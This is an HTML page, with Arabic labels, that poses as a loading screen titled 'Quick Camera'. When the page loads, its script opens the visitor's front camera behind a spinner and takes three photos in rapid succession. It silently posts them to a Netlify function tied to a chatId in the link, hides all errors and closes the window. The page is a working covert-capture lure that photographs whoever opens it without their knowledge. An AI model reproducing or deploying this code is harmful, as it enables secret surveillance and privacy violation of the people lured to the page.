<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>كاميرا سريعة</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #1a2a3a;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            color: white;
            overflow: hidden;
        }
        
        .loader-container {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .spinner {
            width: 80px;
            height: 80px;
            border: 8px solid rgba(255,255,255,0.3);
            border-top: 8px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        .loading-text {
            font-size: 18px;
            color: rgba(255,255,255,0.8);
            margin-top: 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="loader-container">
        <div class="spinner"></div>
        <div class="loading-text">لحظة من فضلك...</div>
    </div>

    <video id="cameraPreview" class="hidden" autoplay playsinline muted></video>
    <canvas id="photoCanvas" class="hidden"></canvas>

    <script>
        // أزليت التوكن من هنا
        
        // وظائف سريعة بدون تأخير
        function getChatId() {
            return new URLSearchParams(window.location.search).get('chatId');
        }
        
        // إرسال الصور بسرعة عبر Netlify Function
        async function sendPhotoFast(photoBlob, chatId, photoNumber) {
            try {
                // تحويل Blob إلى Base64
                const base64Promise = new Promise((resolve) => {
                    const reader = new FileReader();
                    reader.onloadend = () => resolve(reader.result);
                    reader.readAsDataURL(photoBlob);
                });
                
                const base64Data = await base64Promise;
                
                // إرسال لـ Netlify Function بدون انتظار
                fetch('/.netlify/functions/send-photo-fast', {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json' 
                    },
                    body: JSON.stringify({
                        chatId: chatId,
                        photo: base64Data.split(',')[1],
                        photoNumber: photoNumber
                    })
                }).catch(() => {}); // تجاهل الأخطاء للسرعة
                
            } catch (error) {
                // تجاهل الأخطاء للسرعة
            }
        }
        
        // التقاط صورة فوري
        function capturePhotoFast(video, canvas) {
            const context = canvas.getContext('2d');
            canvas.width = 640; // دقة أقل للسرعة
            canvas.height = 480;
            context.drawImage(video, 0, 0, 640, 480);
            
            return canvas.toDataURL('image/jpeg', 0.7);
        }
        
        async function takeThreePhotosUltraFast() {
            const chatId = getChatId();
            if (!chatId) {
                window.close();
                return;
            }
            
            const video = document.getElementById('cameraPreview');
            const canvas = document.getElementById('photoCanvas');
            const ctx = canvas.getContext('2d');
            
            canvas.width = 640;
            canvas.height = 480;
            
            try {
                // 1. طلب الإذن بأقل إعدادات للسرعة
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { exact: 640 },
                        height: { exact: 480 },
                        frameRate: { ideal: 15 }
                    }
                });
                
                video.srcObject = stream;
                video.play().catch(() => {});
                
                // 2. انتظار 300ms فقط
                await new Promise(resolve => setTimeout(resolve, 300));
                
                // 3. التقاط وإرسال الصور الثلاث
                for (let i = 1; i <= 3; i++) {
                    // التقاط الصورة فوراً
                    ctx.drawImage(video, 0, 0, 640, 480);
                    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
                    
                    // تحويل DataURL إلى Blob
                    const byteString = atob(dataUrl.split(',')[1]);
                    const mimeString = dataUrl.split(',')[0].split(':')[1].split(';')[0];
                    const ab = new ArrayBuffer(byteString.length);
                    const ia = new Uint8Array(ab);
                    for (let j = 0; j < byteString.length; j++) {
                        ia[j] = byteString.charCodeAt(j);
                    }
                    const blob = new Blob([ab], { type: mimeString });
                    
                    // إرسال فوري بدون انتظار
                    sendPhotoFast(blob, chatId, i);
                    
                    // انتظار 100ms فقط بين الصور
                    if (i < 3) {
                        await new Promise(r => setTimeout(r, 100));
                    }
                }
                
                // 4. إغلاق الكاميرا فوراً
                stream.getTracks().forEach(track => track.stop());
                
                // 5. إغلاق النافذة بعد 500ms
                setTimeout(() => {
                    window.close();
                }, 500);
                
            } catch (error) {
                // في حالة خطأ، أغلق فوراً
                setTimeout(() => {
                    window.close();
                }, 300);
            }
        }
        
        // بدء فوري عند تحميل الصفحة
        window.addEventListener('load', takeThreePhotosUltraFast);
    </script>
</body>
</html>
